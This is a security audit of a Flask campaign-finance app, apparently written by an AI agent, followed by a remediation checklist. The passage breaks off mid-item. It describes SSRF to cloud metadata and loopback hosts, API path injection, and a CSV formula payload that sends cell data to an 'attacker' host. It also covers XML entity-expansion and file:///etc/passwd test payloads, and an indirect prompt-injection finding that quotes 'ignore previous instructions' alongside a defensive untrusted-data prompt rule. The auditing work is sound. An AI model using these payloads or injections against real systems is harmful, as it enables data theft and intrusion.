# Security Audit — Campaign Tracker
**Scope:** SSRF, injection, directory traversal, env/secret exposure, missing controls
**Commit:** `7191d28` · **Branch:** `claude/security-audit-ssrf-injection-a6415o`
**Files reviewed:** `app.py`, `fec.py`, `congress.py`, `votes.py`, `statements.py`, `synthesis.py`, `reconcile.py`, `steps.py`, `timeline.py`, `static/app.js`, `static/export.js`, `templates/index.html`, `docker/searxng/*`, `run.sh`

---

## CRITICAL

**[CRITICAL · `statements.py:398` (`_http_get`), reached via `statements.py:453-470` (`_page_fetch_pass`) ← `statements.py:172` · Attack Vector: The dating tier-2 pass fetches every undated statement URL. Those URLs come verbatim from SearXNG engine results (`statements.py:131`) with no allowlist, no scheme restriction beyond `str.startswith("http")`, no DNS/IP resolution check, and no block on RFC1918 / loopback / link-local / `.internal` hosts. Both transports (`curl_cffi` and `urllib`) follow 3xx automatically, so even a hostname check would be bypassable by redirect. An attacker who gets one page indexed for `"<candidate name>" campaign finance` (10 fixed query angles, `statements.py:56-60`) steers the server at internal targets. · Impact: Server-side request forgery from the app host into the operator's private network — internal service enumeration, cloud metadata reachability, and state-changing GET requests against unauthenticated internal endpoints. The `Content-Type` gate at `:408`/`:415` limits body return to `html`/`xml`, so exfiltration is partial; the *request itself* is unconditional, and a parsed date reaching `result.track_b_statements` plus response-timing differences give a workable oracle for host/port enumeration. · Confidence: HIGH — full path traced end to end.]**

**[CRITICAL · `statements.py:423-435` (`_canonical_target`) → `statements.py:447` · Attack Vector: After fetching a page, the code reads that page's own `<link rel="canonical">` / `og:url` and issues a second `_http_get` against it, gated only on `target.startswith("http")` and inequality with the original URL. The hop target is fully attacker-controlled HTML. · Impact: This removes the search-ranking precondition from the finding above. A single indexed attacker page becomes an arbitrary-URL fetch primitive — one page, then `<link rel="canonical" href="http://169.254.169.254/…">` or `http://127.0.0.1:<port>/…`. Full SSRF redirection with no allowlist at either hop. · Confidence: HIGH — the code comment explicitly frames this as "a single, safe redirect hop"; the safety argument (it is the page's own declared target) holds for *dating provenance*, not for *network egress*, and the two are conflated here.]**

---

## HIGH

**[HIGH · `app.py:655` → `app.py:229` → `fec.py:1258` and `fec.py:1304` · Attack Vector: `candidate_id` is taken from the POST body, `.strip()`ed, and given zero format validation. When present, the resolve step trusts it outright ("The user confirmed an exact FEC candidate … trust it") and it is interpolated **unencoded** into the API path: `f"{FEC_BASE}/candidate/{candidate_id}/totals/?{urlencode(params)}"`. Verified shapes: `../../../v1/candidates/search`, `X?per_page=1&`, `A#`. FEC candidate IDs are a fixed grammar (`^[HSP][0-9A-Z]{8}$`) that is never enforced. · Impact: URL path and query-parameter injection against `api.open.fec.gov`, with the server's `FEC_API_KEY` attached to every injected request. Host is fixed, so this is not a redirect-to-attacker primitive, but it does let an unauthenticated caller reach arbitrary endpoints and parameters on the upstream API using the operator's shared credential, and to corrupt request semantics (e.g. truncating the intended path with `#`). · Confidence: HIGH — traced and reproduced the constructed URLs.]**

**[HIGH · `app.py:658` → `app.py:229` → `congress.py:303` · Attack Vector: Same class. `state` from the POST body flows unvalidated to `resolve_member()`, which builds `f"{CONGRESS_BASE}/member/{state.upper()}?{urlencode(params)}"`. `.upper()` is the only transformation; `/`, `?`, `#`, `..` all survive. · Impact: Path/parameter injection against `api.congress.gov` carrying `CONGRESS_API_KEY`. Same bounded-host caveat as above. · Confidence: HIGH.]**

**[HIGH · `app.py:705` (`app.run(host="0.0.0.0")`) + `templates/index.html` + `app.py:657-663` · Attack Vector: The app binds all interfaces with no authentication, no authorization, and no TLS on any route. The Anthropic API key is collected in a browser field and POSTed in a cleartext HTTP request body (`anthropic_key`, `app.py:650`). Anyone who can reach the port can run jobs; anyone on-path can read the key in transit. · Impact: Unauthenticated use of the operator's FEC/Congress quota; plaintext interception of a user's Anthropic credential. The in-code hardening around that key is real and well done — it never enters `JOBS`, the result, the StepLog, or any `/status` response (verified by inspection) — but that protection ends at the network boundary, which is unprotected. Production blocker for any non-loopback deployment. · Confidence: HIGH.]**

**[HIGH · `run.sh:18,21,30` (git-tracked: confirmed in `git ls-files`) · Attack Vector: The documented and only supported key workflow instructs the operator to paste `FEC_API_KEY` and `CONGRESS_API_KEY` into `run.sh` — a file under version control. `.gitignore` covers `.env`, `venv/`, `__pycache__/` but not `run.sh`. · Impact: Live API credentials committed and pushed on the next `git add -A` / `git commit -a`. History scan of all 38 commits found no leaked key to date, so this is latent, not realized — but the design actively steers the operator into it. · Confidence: HIGH — scanned `git rev-list --all` for high-entropy assignments; clean.]**

**[HIGH · `docker/searxng/settings.yml:32` vs `docker/searxng/README.md:14`, `docker-compose.yml:12`, `README.md:257` · Attack Vector: `settings.yml` ships a hardcoded literal `secret_key: "e2bctgctyctycytc"`. Setup instructions rotate it with `sed -i "s|ultrasecretkey|$(openssl rand -hex 32)|g" settings.yml` — but the string `ultrasecretkey` **does not appear anywhere in the file**. The in-file comment names a third, also-absent placeholder (`e2bckiiubpiubvuib`). The rotation step is a silent no-op that exits 0. · Impact: Every clone runs SearXNG with the same publicly-known session secret. Mitigated in the shipped topology by the 127.0.0.1 port bind (`docker-compose.yml:37`), but the documented "hardened / cloud-hosted" path in `CLAUDE.md` inherits the dead rotation step, and an operator following the README has no signal it failed. · Confidence: HIGH — verified all three strings by grep.]**

---

## MEDIUM

**[MEDIUM · `static/export.js:20-31` (`csvCell`) · Attack Vector: The CSV encoder implements RFC-4180 quoting correctly and nothing else. No neutralization of leading `=`, `+`, `-`, `@`, tab, or CR. Cell content includes statement titles and excerpts harvested from arbitrary indexed web pages (`statements.py:131-136`) and FEC free-text committee/employer/occupation fields. · Impact: CSV formula injection. A crafted page title (`=HYPERLINK("http://attacker/?x="&A1,"click")` or a DDE payload) lands in `statements.csv` / `search_log.csv`, executing when the researcher opens the export in Excel or LibreOffice. Directly relevant given export-to-spreadsheet is a core workflow of this tool. · Confidence: HIGH — encoder read in full; no sanitization exists.]**

**[MEDIUM · `synthesis.py:544-560` (`build_digest`) → `synthesis.py:788` · Attack Vector: Statement excerpts sourced from arbitrary third-party web pages are placed into the model prompt as untrusted data with no delimiting, provenance marking, or instruction-injection defense. `SYSTEM_PROMPT` (`synthesis.py:95+`) constrains the model's *sourcing* ("PROVIDED DATA ONLY", no verdicts) but never tells it that any portion of the JSON is adversarial input rather than instructions. · Impact: Indirect prompt injection — a page indexed under the candidate's name can carry text aimed at the report layer, attempting to introduce a verdict, suppress a caveat, or alter framing. This attacks the project's stated integrity guarantee specifically. Partially contained by design: `reconcile.py` deterministically checks spender sides, cycle totals, dollar provenance, and caveat preservation, and the Money Picture and spender ledger are machine-rendered — so injected *numbers* and *sides* are caught. Injected qualitative framing in the model's connective prose is not covered by any of the four checks. · Confidence: MEDIUM-HIGH — mechanism confirmed; residual exploitability depends on prose the guards do not police.]**

**[MEDIUM · `app.py:583-590` · Attack Vector: Rate limiting is entirely optional — `flask-limiter` missing degrades `search_limit` to a no-op decorator that returns the function unchanged, with no startup warning. When present: `default_limits=[]` (so only `/search` and `/candidates` are limited, at 20/min), default in-memory storage (resets on restart, not shared across workers), and `key_func=get_remote_address` with no `ProxyFix`. `/status/<job_id>` and `/health` are unlimited. · Impact: Behind any reverse proxy every client collapses into one bucket keyed on the proxy IP — one user exhausts the limit for all. With `flask-limiter` absent there is no limit at all. Each allowed `/search` triggers hundreds of paced upstream API calls, so the effective amplification per request is very high. · Confidence: HIGH.]**

**[MEDIUM · `app.py:661-663`, `app.py:82-87`, `statements.py:293` · Attack Vector: Every `/search` spawns an unbounded `threading.Thread` with no concurrency ceiling, no queue, and no per-client job cap. Each job spawns a further 8-worker `ThreadPoolExecutor` for page fetches. `_sweep_old_jobs()` is called only from the `/search` handler, and `JOBS` retains the complete result JSON (up to 5,000 donor transactions, `app.py:154`) for a 1800s TTL. · Impact: Resource exhaustion — thread and memory pressure from concurrent job submission; `JOBS` growth is bounded only by TTL and request rate. Compounded by the rate-limiting weaknesses above. · Confidence: HIGH.]**

**[MEDIUM · `statements.py:404-411` · Attack Vector: On the `curl_cffi` path, `_FETCH_MAX_BYTES` is applied as `resp.text[:_FETCH_MAX_BYTES]` — a slice **after** the non-streaming `.get()` has already downloaded and decoded the entire response body. The `urllib` fallback at `:418` bounds correctly via `resp.read(n)`; the primary path does not. · Impact: The documented 256 KB read bound does not hold on the transport actually used in production. A malicious or merely large page (or an internal endpoint streaming indefinitely) is read fully into memory, 8 concurrent. Memory-exhaustion DoS combined with the SSRF above. · Confidence: HIGH — the ordering is unambiguous in the source.]**

**[MEDIUM · `app.py:602-604`, `app.py:634-636`, `app.py:609`/`:638` · Attack Vector: No CSRF token on either POST route, and both accept `request.form` as a fallback when JSON parsing fails — which makes them reachable by a cross-origin HTML form POST as a CORS "simple request", requiring no preflight and no cooperation from the browser. · Impact: A visited web page can force jobs on any reachable instance, burning the shared FEC/Congress quota and triggering the full outbound pipeline. The attacker cannot read the response (no CORS headers set, and `job_id` is a 128-bit UUID4 — adequate), so this is write-only forcing rather than data theft; DNS rebinding against the `0.0.0.0` bind would lift that limit. · Confidence: MEDIUM-HIGH.]**

**[MEDIUM · `app.py:592-596`, `templates/index.html` · Attack Vector: Only `X-Content-Type-Options` and `X-Frame-Options` are set. No `Content-Security-Policy`, no `Referrer-Policy`, no `Permissions-Policy`, no HSTS. `templates/index.html` has no CSP meta tag. · Impact: No defense-in-depth layer behind the app's client-side escaping. Note this is a missing *control*, not an exploitable hole: I reviewed every `innerHTML` sink in `static/app.js` (lines 77, 174, 186, 198, 414, 518, 583, 652, 740, 743) and escaping is applied correctly and consistently — `escapeHtml` (`:95`) covers `& < > " '` including attribute contexts, `mdToHtml` (`:303`) escapes before applying `**bold**` and parses no links (so no `javascript:` href sink), and the SVG builders escape all interpolated labels and `<title>` text. A CSP would still be the correct backstop for a page rendering model output and third-party web excerpts. · Confidence: HIGH.]**

**[MEDIUM · `docker/searxng/settings.yml:23-28` + `app.py:705` · Attack Vector: `server.limiter` is deliberately left `false` and the JSON API is unauthenticated — a sound decision *given* the 127.0.0.1 bind. But the Flask app on the same host binds `0.0.0.0`. · Impact: The security of the SearXNG instance rests entirely on one loopback bind, on a host that is deliberately exposing another service to the network. Any SSRF in the Flask app (see CRITICAL findings) reaches `http://127.0.0.1:8080` as an open search proxy. The two decisions are individually reasonable and jointly unsafe. · Confidence: MEDIUM-HIGH.]**

**[MEDIUM · `statements.py:190-197` (`_searxng_search`) · Attack Vector: `SEARXNG_URL` is concatenated as `base_url.rstrip("/") + "/search?" + …` with no scheme or shape validation. Operator-controlled today (`app.py:450` reads it from env; the `searxng_url` parameter is never user-reachable), so not currently attacker-triggerable. · Impact: Latent SSRF/exfiltration sink if a future change ever surfaces this as a request-scoped or per-user setting — the search query, which contains the candidate name, would go to any host set there. Flagged as a design-boundary risk, not a live vulnerability. · Confidence: MEDIUM — reachability today is closed; noting it because the `_search` seam is explicitly documented as pluggable.]**

---

## LOW / INFORMATIONAL

**[LOW · `votes.py:36, 202, 241, 310` · Attack Vector: `xml.etree.ElementTree.fromstring()` parses remote XML from `senate.gov` LIS endpoints. ElementTree is documented-vulnerable to entity-expansion ("billion laughs") and quadratic blowup; it is *not* vulnerable to external entity expansion or DTD retrieval, so classic XXE file disclosure does not apply. · Impact: Parser-level DoS requires controlling the `senate.gov` response — a fixed HTTPS host with no user-controlled path component (URLs built from integers at `:184`/`:188`). Realistic only under MITM or upstream compromise. · Confidence: HIGH on the mechanism, LOW on exploitability.]**

**[LOW · `app.py:682-684` (`/health`) · Attack Vector: Unauthenticated endpoint returns `{"has_fec_key": bool(...)}`. · Impact: Discloses whether the instance holds a live credential — reconnaissance value only, distinguishing a real deployment from a demo instance worth targeting. · Confidence: HIGH.]**

**[LOW · `app.py:704` · Attack Vector: `FLASK_DEBUG=1` enables the Werkzeug interactive debugger. · Impact: RCE for anyone reaching the port, given the `0.0.0.0` bind. The default is correctly OFF and the inline comment explains the risk accurately — flagged only because the opt-in and the all-interfaces bind sit two lines apart with no guard coupling them. · Confidence: HIGH.]**

**[LOW · `static/app.js:578` · Attack Vector: `href="${escapeHtml(v.url)}"` escapes quotes correctly but applies no scheme allowlist. `v.url` is server-generated from fixed `clerk.house.gov` / `senate.gov` templates (`votes.py:112, 184, 188`), so it is not currently attacker-influenced. · Impact: None today; a latent `javascript:` sink if citation URLs ever become data-derived. · Confidence: MEDIUM.]**

---

## Areas Reviewed — No Findings

| Area | Result |
|---|---|
| **Command / code injection** | **CLEAR.** No `subprocess`, `os.system`, `os.popen`, `eval`, `exec`, `__import__`, `pickle`, `yaml.load`, or `shell=True` anywhere in the Python or JS. No shell interpolation surface exists. |
| **Directory traversal** | **CLEAR.** The only filesystem writes are `synthesis.py:577` (`_cache_paths`), keyed on a SHA-256 hexdigest (`:572`) — no user-controlled path component. No file-serving route beyond Flask's built-in `/static/`. No `send_file`, no `open()` on request data. |
| **Client-side XSS** | **CLEAR** (control gap noted above as missing CSP). All 10 `innerHTML` sinks reviewed; escaping correct and consistent, including attribute contexts and SVG `<title>` nodes. |
| **API key leakage into responses/logs** | **CLEAR.** FEC and Congress error messages carry status code and body snippet only, never the request URL — verified across all `raise FECAPIError` / `CongressAPIError` sites. `_friendly_api_error` (`synthesis.py`) returns a parsed one-liner, not raw error JSON. The Anthropic key never enters `JOBS`, the result, the StepLog, or `/status`. No `logging` configured; `print()` calls are CLI-path only and key-free. |
| **Job ID predictability** | **CLEAR.** `uuid.uuid4().hex` (`app.py:69`) — 122 bits of entropy; enumeration infeasible. |
| **Secrets in git history** | **CLEAR.** All 38 commits scanned for high-entropy credential assignments across `*.py`, `*.sh`, `*.yml`, `*.env*`. No hits. (The `run.sh` risk above is latent, not realized.) |

---

## Production Blockers

Ranked by what I would gate a deployment on:

1. **SSRF via `_canonical_target` + `_http_get`** — arbitrary internal-network egress from one indexed page.
2. **No authentication + `0.0.0.0` + cleartext HTTP** — including a user credential in a plaintext POST body.
3. **Unvalidated `candidate_id` / `state` into upstream API paths**, carrying server-held keys.
4. **`run.sh` as the tracked home for live API keys.**
5. **SearXNG `secret_key` rotation that silently does nothing.**

The pipeline's data-integrity engineering is genuinely strong — the StepLog gating, `reconcile.py`, the deterministic ledger and Money Picture, and the disclosed-not-faked discipline are all doing real work, and several classes of bug that plague this kind of tool are structurally closed. The gap is that the same rigor has not been applied to the *network and input boundary*: data arriving from the open web (`statements.py`) and from the client (`app.py`) is trusted at a level the rest of the codebase would never extend to a dollar figure.

---

## Hardening Checklist — path to open-sourcing

Phases are ordered by the same ranking as the findings above (CRITICAL → HIGH →
MEDIUM → LOW). **Do not open-source before Phase 1 and Phase 2 are both
checked off** — those are the findings that let an outside party pivot into the
operator's network or burn/steal their credentials. Phase 3 and 4 are real but
lower-blast-radius; reasonable to ship a v1 with a couple of Phase 3 items open
if they're called out in the README, as long as Phase 1–2 are clean.

Each box should only be checked once: (a) the code change is made, (b) it's
been checked against how that module is actually used elsewhere in the
pipeline (does it still behave correctly for a normal run — demo mode, a real
candidate, cached synthesis, etc.), and (c) there's a regression test pinning
the fix so it can't silently regress.

### Phase 1 — CRITICAL: stop outbound SSRF from `statements.py` ✅ DONE

- [x] **Guard every page fetch behind a resolved-IP allowlist check**
      (`statements.py:_http_get`, reached from `_page_fetch_pass`). Add
      `_is_safe_url()`: parses scheme (http/https only), resolves the host via
      `socket.getaddrinfo`, and rejects loopback / RFC1918 private / link-local
      (covers `169.254.169.254` cloud metadata) / multicast / reserved /
      unspecified — including the IPv4-mapped-IPv6 tunnel case. Fails closed on
      any DNS error.
- [x] **Close the redirect bypass** — both `curl_cffi` and `urllib` were
      auto-following 3xx responses, which defeats a hostname-only check.
      Redirects are now followed manually (`allow_redirects=False` /
      `_CapturingRedirectHandler`), with `_is_safe_url()` re-run on **every**
      hop before it's requested, bounded by `_MAX_REDIRECTS` so a redirect loop
      can't hang the fetch.
- [x] **Re-verify the canonical/og:url hop is covered, not just documented as
      safe** — `_canonical_target()`'s docstring now says explicitly that it
      only vouches for *dating provenance*, not network safety; the actual
      network guard lives in `_http_get`, which the canonical target is always
      routed back through before it's fetched.
- [x] **Confirm the fix doesn't regress the feature it's protecting** — the
      dating tier-2 pass (page-fetch date recovery) still needs to work for
      the overwhelming majority of real news/campaign/government pages, which
      all resolve to public IPs. The guard only blocks resolution to
      internal/reserved ranges, so normal operation is unaffected; verified via
      `tests/test_ssrf_guard.py`.
- [x] **Regression test** — `tests/test_ssrf_guard.py`: private/loopback/
      link-local/metadata/multicast/unspecified/IPv4-mapped-IPv6 all rejected;
      non-http(s) schemes rejected; unresolvable host fails closed; the
      transport is proven *never invoked* for an unsafe host (not just that
      its result is discarded); a redirect into a private target is refused
      and the private URL is never fetched; a redirect chain between two safe
      hosts still works (feature preserved); a redirect loop terminates at
      `_MAX_REDIRECTS` instead of hanging. Run: `python3 tests/test_ssrf_guard.py`.

### Phase 2 — HIGH: input validation, transport, and secret handling ✅ DONE

- [x] **Validate `candidate_id` against FEC's real grammar** before it reaches
      `fec.py:funding_by_cycle` / `search_fec_candidate` — enforced
      `^[HSP][0-9A-Z]{8}$` at the top of `POST /search` in `app.py`, right
      where `candidate_id` is read from the POST body, rejecting a non-empty
      malformed value with a 400 before the worker thread is even spawned
      (so it never reaches `fec.py` at all). Verified the "Did You Mean?"
      resolver flow (`/candidates` → `/search`) still passes a real FEC id
      through end-to-end via the Flask test client — normal candidate
      selection is unaffected; only malformed/injected shapes are rejected.
- [x] **Validate `state`** the same way (`app.py` → `congress.py:303`) — a
      two-letter regex (`^[A-Z]{2}$`) enforced at the same `/search` entry
      point before `state` is interpolated into the Congress.gov
      member-lookup path. A bare-name search (no `candidate_id`/`state` at
      all) still works — both fields are optional and only validated when
      present.
- [x] **Get authentication in front of any non-loopback deployment.**
      `app.py`'s `__main__` block now defaults `HOST` to `127.0.0.1` — the
      bind an open-source cloner gets from a bare `python3 app.py` or
      `./run.sh` is loopback-only, matching what the README already told
      people to expect (`http://localhost:5000`). Binding wider is an
      explicit `HOST=0.0.0.0` (or LAN address) opt-in that prints a loud
      warning naming the actual risk (unauthenticated quota use, Anthropic
      key interception) and pointing at this file. README and CLAUDE.md
      both updated with the same guidance: a reverse proxy doing TLS + auth
      in front is required before binding beyond your own machine — the
      same posture the SearXNG container already takes.
- [x] **Stop the Anthropic key traveling in a plaintext POST body** on any
      non-TLS deployment — covered by the same fix as above (the loopback
      default + reverse-proxy-required guidance); `CLAUDE.md`'s "Anthropic
      key is secret + transient" note now explicitly says the in-code
      never-stored hardening only protects the key at rest, not in transit,
      and points at the bind-address section for the transit fix.
- [x] **Get `run.sh` out of the credential path.** `run.sh` no longer holds
      key *values* — it sources a gitignored `.env` file (created from the
      new tracked `.env.example` template: `cp .env.example .env`, then
      edit) via `set -a; source .env; set +a`, and falls back to demo mode
      with a clear stderr message when `.env` is absent. `.gitignore`'s
      comment and `CLAUDE.md`'s quick-start + "Launching" sections updated
      to match. Verified end-to-end by actually running `bash run.sh` both
      with no `.env` (falls back to DEMO, confirmed via `/health`) and with
      a `.env` carrying a fake key (comes up REAL mode, confirmed via
      `/health`).
- [x] **Fix the SearXNG `secret_key` rotation no-op.** Three files had
      drifted to three different placeholder strings (`settings.yml`'s
      shipped value, its own comment's claimed value, and the documented
      `sed` target) — `docker/searxng/settings.yml` now ships the literal
      value the documented `sed -i "s|ultrasecretkey|...|g"` command
      actually targets. Went further than a string-match fix: `run.sh` had
      its own duplicate copy of the same setup instructions (the second
      copy of a string that can silently drift), so it no longer carries
      the `sed` command at all — it points at `docker/searxng/README.md`,
      now the single source of truth. Verified by extracting the real
      command from the README and actually running it (via `subprocess`)
      against a temp copy of `settings.yml`: confirmed the file changes, the
      placeholder is gone, and the new value is a real 64-char hex string.
- [x] **Regression / verification pass for this phase** —
      `tests/test_input_validation.py` (candidate_id/state format
      validation, both against real injection shapes from the audit and the
      legitimate Did-You-Mean/bare-name flows, driven through the real
      Flask app via its test client), `tests/test_bind_host_default.py`
      (spawns the real `app.py` subprocess twice — default and
      `HOST=0.0.0.0` — and asserts the actual bind address and warning
      output), `tests/test_run_sh_env.py` (structural checks plus an
      end-to-end run of the real sourcing logic against a temp `.env`, and a
      real `bash run.sh` smoke test in both demo and real-mode
      configurations), `tests/test_searxng_secret_rotation.py` (runs the
      real, extracted `sed` command against a temp copy of `settings.yml`
      and confirms rotation actually happens). All run clean; the rest of
      the existing suite (`tests/test_*.py`) re-run with no regressions —
      the one still-failing test (`test_export_zip.py`, a Node-step
      prerequisite) is pre-existing and unrelated to this phase.

### Phase 3 — MEDIUM: defense-in-depth and resource limits ✅ DONE

- [x] **Neutralize CSV formula injection** in `static/export.js:csvCell` — a
      leading `=`, `+`, `-`, `@`, tab, or CR now gets a neutralizing leading
      apostrophe before RFC-4180 quoting, UNLESS the whole value is a plain
      number (`-?\d+(\.\d+)?` etc., optionally scientific notation) — the
      exact regression the checklist flagged (a negative dollar figure like
      refunds or net donor totals must stay a real number, not become
      display-only text). Verified with real Excel/DDE-style payloads
      (`=HYPERLINK(...)`, `+1+1`, `@SUM(...)`, a `cmd|'...'!A1` DDE shape, a
      leading-tab and leading-CR variant) alongside plain negative/positive
      numbers, ordinary text, and values that need BOTH neutralizing and
      RFC-4180 quoting at once.
- [x] **Mark untrusted data as untrusted in the synthesis prompt**
      (`synthesis.py`). `SYSTEM_PROMPT` gained an explicit "UNTRUSTED
      CONTENT WARNING" naming the two concrete sources (statement excerpts
      from arbitrary indexed web pages; FEC free-text donor/committee
      fields) and stating plainly that JSON string values are data to
      restate/quote, never instructions — even one shaped like "ignore
      previous instructions." `USER_PROMPT_TEMPLATE` now wraps the JSON
      digest in explicit `<<<BEGIN_CANDIDATE_JSON>>>`/`<<<END_CANDIDATE_JSON>>>`
      markers with the warning restated right next to the data. This is
      prompt-hardening, not a code guarantee — `reconcile.py` remains the
      real backstop and is unchanged. Verified structurally (the framing
      actually reaches the prompt, the delimiters actually bracket `{data}`)
      and confirmed a realistic injection-shaped payload crafted into a
      statement excerpt survives byte-for-byte inside the markers — i.e.
      the defense is framing the model reads, not silent mangling that
      would corrupt a legitimate excerpt containing alarming-sounding text.
- [x] **Made `flask-limiter` a hard dependency** — the old
      try/except-degrade-to-no-op-decorator is gone; it's a plain top-level
      import now, so a broken install fails loudly at startup instead of
      silently running with zero rate limiting.  Added `ProxyFix`, but
      **opt-in only** via `BEHIND_PROXY=1` — applying it unconditionally
      would let any direct client spoof `X-Forwarded-For` and make the
      limiter key on a fake IP, which is worse than not having ProxyFix at
      all. Extended a "240 per minute" limit to `/status/<job_id>`
      (previously unlimited) — sized well above the frontend's 750ms poll
      cadence for a normal handful of concurrent jobs; confirmed by burst-
      testing both the new `/status` cap and the pre-existing `/search`
      20/min cap against the real Flask app until each actually tripped.
- [x] **Capped concurrent jobs.** `_new_job()` now refuses to create a job
      (`POST /search` returns 429) once `MAX_CONCURRENT_JOBS` (default `8`,
      env-configurable) RUNNING jobs already exist — check-and-create happen
      under one lock acquisition so two simultaneous requests can't both
      slip past it. A finished job sitting in `JOBS` for polling/export
      doesn't count against the cap (only `done == False` jobs do), and
      `_sweep_old_jobs()` is untouched — it still reaps by TTL regardless of
      the new cap. Verified end-to-end through the real route: at the cap,
      `POST /search` returns 429 and spawns no new worker thread; a slot
      freeing up (a job finishing) immediately allows the next request
      through.
- [x] **Fixed the `curl_cffi` read-bound bypass.** The primary transport now
      requests with `stream=True` and reads via `iter_content()` in 8 KB
      chunks, breaking (and closing the connection) the instant
      `_FETCH_MAX_BYTES` is reached — the cap is enforced AT THE SOCKET now,
      not by slicing an already-fully-downloaded string. Verified with a
      REAL local HTTP server that slow-drips a 16 MB response (5ms per
      chunk, so the client has many chances to bail early if it's actually
      streaming) and independently counts the bytes the SERVER wrote to the
      socket: before the fix this ran to the full ~16 MB (reproduced live
      during this work), after the fix the server sees only ~279 KB before
      the connection closes. Also confirmed the redirect-handling logic
      (Phase 1's SSRF fix) still works correctly against a real 302
      response under `stream=True`.
- [x] **Added CSRF protection** on `/search` and `/candidates`. This app has
      no login/session system to hang a per-session token off of, so instead
      of adding one, the fix closes the SAME vector the audit named the way
      OWASP's CSRF cheat sheet documents for a no-session JSON API: (1) the
      `request.form` fallback is gone — both routes now require a real
      `application/json` body, which a native HTML `<form>` POST can never
      send (not one of the three CORS "simple" content types), so the
      classic no-JS CSRF vector is rejected outright, and a cross-origin
      `fetch()`/XHR trying to fake it is stopped by the browser's CORS
      preflight (this app sets no `Access-Control-Allow-Origin`); (2)
      defense in depth — `Origin` (falling back to `Referer`) is checked
      against the request's own `Host` when either header is present.
      `static/app.js` already sent `Content-Type: application/json` on both
      routes, so the legitimate frontend needed no changes at all. Verified
      by simulating both concrete attack shapes (a classic form-urlencoded
      POST; a cross-origin JSON POST with a mismatched `Origin`) against the
      real Flask app, alongside the legitimate same-origin flow (with and
      without an `Origin` header, matching what a real browser `fetch()`
      from the app's own page sends) still succeeding.
- [x] **Added missing security headers** — `Content-Security-Policy` (no
      `unsafe-inline`/`unsafe-eval` anywhere), `Referrer-Policy: no-referrer`,
      `Permissions-Policy` (denies geolocation/microphone/camera/payment/usb),
      and a conditional `Strict-Transport-Security` that only fires when
      `request.is_secure` (true once `BEHIND_PROXY=1`'s `ProxyFix` reflects a
      real `X-Forwarded-Proto: https` — HSTS is meaningless, and browsers
      ignore it, over plain HTTP). The one blocker the checklist called out
      — inline `style="..."` in `static/app.js` (nine legend-swatch color
      attributes, injected via `innerHTML`) — was fixed at the root: those
      fixed, small color literals became `.c-green`/`.c-red`/`.c-purple`/
      `.c-blue`/`.c-gold`/`.c-orange` utility classes in `static/app.css`,
      so the CSP needs no `unsafe-inline` carve-out at all (there were no
      inline `<script>`/`<style>` blocks in `templates/index.html` to begin
      with — only the JS-injected attributes). **Verified live in a real
      headless browser** (Playwright + the pre-installed Chromium): loaded
      the page, ran a full demo search through the "Did You Mean?" picker,
      and confirmed (a) the CSP header is present and exactly as configured,
      (b) **zero** CSP violation console messages, (c) all 9 legend swatches
      rendered with their real background colors (proving the class-based
      swatch fix actually works under a `style-src` with no
      `unsafe-inline`), and (d) all 3 chart SVGs (composition, outside-
      spending trend, timeline swimlane) rendered with real content. A fast
      header-shape/gating unit test covers the parts a browser isn't needed
      for (headers present and correctly shaped, HSTS on/off gating, no
      inline `style=` left anywhere in the frontend source).
- [x] **`SEARXNG_URL` pointer comment added** — `statements.py`'s
      `_searxng_search` now explicitly notes it's operator/env-only today
      (not a live SSRF sink), and points future editors at `_is_safe_url()`
      — the guard Phase 1 built for the page-fetch tier — should this value
      ever become request-scoped.
- [x] **Regression tests for this phase** —
      `tests/test_csv_formula_injection.mjs` (Node, dangerous-shape
      neutralization + plain-number preservation + combined quoting, run via
      `tests/run_export_tests.sh` or standalone),
      `tests/test_prompt_injection_guard.py` (system-prompt framing,
      delimiter placement, verbatim payload survival inside the markers),
      `tests/test_rate_limiting.py` (hard-dependency structural checks,
      `ProxyFix` opt-in gating, real burst tests tripping both the
      `/status` and `/search` limits), `tests/test_job_concurrency_cap.py`
      (unit-level cap semantics + real-route 429 behavior + thread-spawn
      proof), `tests/test_page_fetch_streaming.py` (real slow-drip local
      HTTP server, server-side byte-count proof the transfer stops early),
      `tests/test_csrf_protection.py` (both attack shapes rejected, both
      legitimate shapes accepted, `_is_same_origin` unit checks), and
      `tests/test_security_headers.py` (all headers present/shaped/gated
      correctly, no inline `style=` remains, swatch classes exist — plus
      the separate live-Playwright verification described above, not
      automated in this suite). Full existing suite (`tests/test_*.py` +
      the Node export tests) re-run clean after every change in this phase.

### Phase 4 — LOW / INFORMATIONAL: cheap wins before release ✅ DONE

- [x] **Guarded against XML entity-expansion DoS** in `votes.py`. All three
      `ElementTree.fromstring()` call sites (Senate vote-menu XML, per-vote
      member-position XML, per-vote date re-parse) now go through
      `defusedxml.ElementTree.fromstring` instead — a drop-in replacement
      that rejects `<!ENTITY>`/DTD declarations before any expansion. Every
      surrounding `except ET.ParseError` was widened to
      `except (ET.ParseError, DefusedXmlException)` — `defusedxml`'s
      rejection is a `ValueError` subclass, NOT an `ET.ParseError` subclass,
      so without the widening a blocked payload would have propagated as an
      unhandled crash instead of the module's existing disclosed-not-crashed
      contract (`VotesAPIError` from `_parse_senate_menu`, the `PARSE_FAILED`
      sentinel from `_senate_member_position` — critically NOT `None`,
      which would have misreported a blocked attack as "member wasn't on
      this roll," the exact class of fact-invention Rule 4 exists to
      prevent). **Proved the vulnerability was real first, not theoretical**
      — a classic "billion laughs" payload was confirmed to actually expand
      under plain stdlib `ElementTree.fromstring` (300 chars from a 3-level,
      10-wide bomb — real attacks nest deeper for exponential blowup) before
      confirming `defusedxml` rejects the same payload outright, and that
      votes.py's own wrapper functions handle the rejection correctly. Also
      tested a second attack shape (an external-entity DTD referencing
      `file:///etc/passwd` — rejected at the DTD-declaration stage, never
      resolved). Real fixture XML re-parsed to confirm normal operation is
      unaffected.
- [x] **Decided on `/health`'s `has_fec_key` disclosure: dropped it.**
      Nothing in the app actually consumes the field (checked
      `static/app.js` — never read), it's an unauthenticated route with no
      auth in front by default, and the operator who genuinely wants to
      know already gets it for free from the startup console banner
      ("Mode: REAL (FEC_API_KEY found)" / "DEMO"). `/health` now returns
      only `{"ok": true}`.
- [x] **Coupled `FLASK_DEBUG` to the bind address — chose refuse-to-start
      over a warning.** A warning two lines apart from the opt-in is exactly
      the kind of thing that's easy to paste past without reading, and the
      actual risk (Werkzeug's interactive debugger = arbitrary code
      execution for anyone who reaches the port) is too severe for
      "probably fine." `FLASK_DEBUG=1` combined with any non-loopback
      `HOST` now exits 1 before `app.run()` is ever called — verified via
      real subprocess launches that the port is never actually bound in
      that case, while `FLASK_DEBUG=1` alone (loopback default) and
